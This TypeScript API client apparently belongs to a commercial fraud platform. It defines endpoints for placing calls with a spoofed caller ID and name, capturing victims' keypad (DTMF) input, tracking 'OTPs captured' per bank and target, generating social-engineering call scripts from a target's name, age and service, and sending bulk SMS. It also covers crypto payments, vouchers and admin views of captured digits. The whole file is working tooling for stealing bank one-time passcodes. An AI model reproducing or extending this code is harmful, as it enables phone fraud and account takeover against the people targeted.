const BASE = process.env.NEXT_PUBLIC_API_URL || "";

function getToken(): string {
  if (typeof window === "undefined") return "demo";
  return localStorage.getItem("auth_token") || "demo";
}

interface ApiError {
  error: string;
}

export interface CNAMResponse {
  number: string;
  name: string;
  error?: string;
}

export interface CallResponse {
  call_id: string;
  status: string;
  tokens_deducted: number;
  cost_usd: number;
  sip_call_id?: string;
  sip_error?: string;
}

export interface CallDetail {
  id: string;
  user_id: string;
  spoofed_caller_id: string;
  spoofed_name: string;
  destination_number: string;
  status: string;
  duration_seconds: number;
  tokens_cost: number;
  cost_usd: number;
  dtmf_captured: string;
  created_at: string;
  ended_at: string | null;
}

export interface DTMFResponse {
  call_id: string;
  digits: { Digit: string; TimestampMs: number }[];
}

export interface Script {
  id: string;
  title: string;
  target_name: string;
  target_service: string;
  goal: string;
  script_type: string;
  content: string;
  tokens_cost: number;
  is_library: boolean;
  created_at: string;
}

export interface SMSResponse {
  status: string;
  message_id: string;
}

export interface BulkSMSResponse {
  campaign_id: string;
  targets: number;
  sent: number;
  status: string;
}

export interface BalanceResponse {
  balance: number;
  is_vip: boolean;
  vip_expires: string | null;
}

export interface PaymentResponse {
  user_id: string;
  payment_id: string;
  currency: string;
  amount: number;
  tokens: number;
  status: string;
  pay_address: string;
  pay_amount: number;
}

export interface Transaction {
  id: string;
  type: string;
  amount: number;
  tokens: number;
  status: string;
  description: string;
  created_at: string;
}

export interface Stats {
  total_calls: number;
  total_minutes: number;
  total_tokens: number;
  otps_captured: number;
  success_rate: number;
}

export interface CallRecord {
  id: string;
  spoofed_caller_id: string;
  spoofed_name: string;
  destination_number: string;
  status: string;
  duration_seconds: number;
  tokens_cost: number;
  cost_usd: number;
  dtmf_captured: string;
  created_at: string;
}

export interface Dashboard {
  total_users: number;
  active_calls: number;
  total_calls: number;
  total_revenue: number;
}

export interface User {
  id: string;
  email: string;
  balance: number;
  is_vip: boolean;
  tokens_used: number;
  total_calls: number;
  created_at: string;
}

export interface ServiceStatus {
  name: string;
  status: string;
  mode: string;
}

export interface Settings {
  country_code: string;
  webhook_url: string;
  ringtone: boolean;
  vibrate: boolean;
}

export interface OTPGrab {
  id: string;
  status: string;
  phone_number: string;
  bank_name: string;
  target_name: string;
  dtmf_captured: string;
  created_at: string;
}

async function request<T>(method: string, path: string, body?: unknown): Promise<T> {
  const token = getToken();
  const res = await fetch(`${BASE}/api${path}`, {
    method,
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${token}`,
    },
    body: body ? JSON.stringify(body) : undefined,
  });
  if (!res.ok) {
    const err = await res.json().catch(() => ({ error: res.statusText })) as ApiError;
    throw new Error(err.error || `HTTP ${res.status}`);
  }
  return res.json() as Promise<T>;
}

export const api = {
  request,
  lookupCNAM: (number: string) => request<CNAMResponse>("GET", `/cnam?number=${encodeURIComponent(number)}`),
  originateCall: (data: { spoofed_caller_id: string; spoofed_name: string; destination_number: string }) =>
    request<CallResponse>("POST", "/call", data),
  endCall: (callId: string) => request<{ status: string; duration_seconds: number; tokens_cost: number; cost_usd: number }>("POST", `/call/${callId}/end`),
  getCall: (callId: string) => request<CallDetail>("GET", `/call/${callId}`),
  submitDTMF: (callId: string, digit: string, ts: number) =>
    request<{ status: string }>("POST", `/call/${callId}/dtmf`, { digit, timestamp_ms: ts }),
  getDTMF: (callId: string) => request<DTMFResponse>("GET", `/call/${callId}/dtmf`),
  muteCall: (callId: string, muted: boolean) => request<{ status: string; muted: boolean }>("POST", `/call/${callId}/mute`, { muted }),
  generateScript: (data: { target_name: string; target_age?: number; target_service?: string; target_details?: string; goal: string; script_type?: string }) =>
    request<{ id: string; script: string; tokens_cost: number }>("POST", "/script/generate", data),
  listScripts: () => request<{ scripts: Script[] }>("GET", "/scripts"),
  deleteScript: (id: string) => request<{ status: string }>("DELETE", `/script/${id}`),
  sendSMS: (data: { phone_number: string; content: string; sender_id?: string }) =>
    request<SMSResponse>("POST", "/sms/send", data),
  sendBulkSMS: (data: { targets: string; content: string; sender_id?: string }) =>
    request<BulkSMSResponse>("POST", "/sms/bulk", data),
  getBalance: () => request<BalanceResponse>("GET", "/wallet/balance"),
  createPayment: (data: { currency: string; amount: number }) =>
    request<PaymentResponse>("POST", "/wallet/payment", data),
  redeemVoucher: (code: string) => request<{ status: string; tokens: number }>("POST", "/wallet/voucher", { code }),
  upgradeVIP: () => request<{ status: string; duration_days: number }>("POST", "/wallet/vip"),
  getTransactions: () => request<{ transactions: Transaction[] }>("GET", "/wallet/transactions"),
  getStats: () => request<Stats>("GET", "/stats"),
  getRecentCalls: () => request<{ calls: CallRecord[] }>("GET", "/stats/calls"),
  getDashboard: () => request<Dashboard>("GET", "/admin/dashboard"),
  listUsers: () => request<{ users: User[] }>("GET", "/admin/users"),
  adjustBalance: (userId: string, amount: number, reason: string) =>
    request<{ status: string }>("POST", `/admin/user/${userId}/balance`, { amount, reason }),
  generateVoucher: (prefix: string) =>
    request<{ code: string; tokens: number }>("POST", "/admin/voucher", { prefix }),
  getDTMFLogs: () => request<{ dtmf_logs: unknown[] }>("GET", "/admin/dtmf-logs"),
  getSettings: () => request<Settings>("GET", "/settings"),
  updateSettings: (data: { country_code?: string; webhook_url?: string; ringtone?: boolean; vibrate?: boolean }) =>
    request<{ status: string }>("PUT", "/settings", data),
  getServices: () => request<{ services: ServiceStatus[] }>("GET", "/health/services"),
};
